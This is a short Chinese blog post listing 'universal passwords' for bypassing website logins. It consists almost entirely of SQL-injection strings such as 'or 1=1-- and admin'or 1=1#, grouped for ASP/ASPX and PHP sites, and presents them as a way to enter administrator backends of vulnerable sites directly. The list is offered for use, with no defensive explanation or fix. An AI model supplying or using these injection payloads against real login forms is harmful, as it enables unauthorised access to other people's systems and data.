    <content><![CDATA[<h1 id="绕过登陆常用万能密码"><a href="#绕过登陆常用万能密码" class="headerlink" title="绕过登陆常用万能密码"></a>绕过登陆常用万能密码</h1><p>所谓万能密码就是绕过登录验证直接进入管理员后台的密码，这种类型的密码可以通用到很多存在此漏洞的网站所以称之为万能。</p>
<h3 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">2：&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">3：or 1=1--</span><br><span class="line"></span><br><span class="line">4：&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">5：a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">7：&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">8：&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27;</span><br></pre></td></tr></table></figure></div>

<p>admin’or 1&#x3D;1#</p>
<h3 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h3><p>admin’&#x2F;*<br>密码*&#x2F;‘<br>‘or 1&#x3D;1&#x2F;*</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line"></span><br><span class="line">&quot;or 1=1--</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;</span><br><span class="line"></span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&quot;or1=1--</span><br><span class="line"></span><br><span class="line">&quot;or=or&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;) or (&#x27;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;.).or.(&#x27;.a.&#x27;=&#x27;.a</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1--</span><br><span class="line"></span><br><span class="line">&#x27;or 1=1/*</span><br><span class="line"></span><br><span class="line">&#x27;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27; &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;or.&#x27;a.&#x27;=&#x27;a</span><br><span class="line"></span><br><span class="line">&#x27;or1=1--</span><br><span class="line"></span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27; 1=1--</span><br><span class="line"></span><br><span class="line">a&#x27;or&#x27;1=1--</span><br><span class="line"></span><br><span class="line">or &#x27;a&#x27;=&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">or 1=1--</span><br><span class="line"></span><br><span class="line">or1=1--</span><br></pre></td></tr></table></figure></div>



]]></content>
